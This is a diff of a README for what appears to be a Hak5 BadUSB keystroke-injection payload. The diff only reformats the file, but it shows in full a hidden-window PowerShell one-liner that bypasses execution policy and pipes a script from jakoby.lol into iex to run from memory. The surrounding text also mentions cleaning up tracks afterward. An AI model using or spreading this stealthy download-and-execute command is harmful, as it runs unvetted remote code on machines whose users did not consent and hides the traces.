@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
@@ -37,9 +39,9 @@ Lastly, to clean up your tracks behind you, the tmp folder will be emptied and t
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 * Place your images URL in the $url variable
-```
+<pre><code>
 powershell -w h -NoP -NonI -Exec Bypass $url='URL-HERE';irm jakoby.lol/pkw | iex
-```
+</code></pre>
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
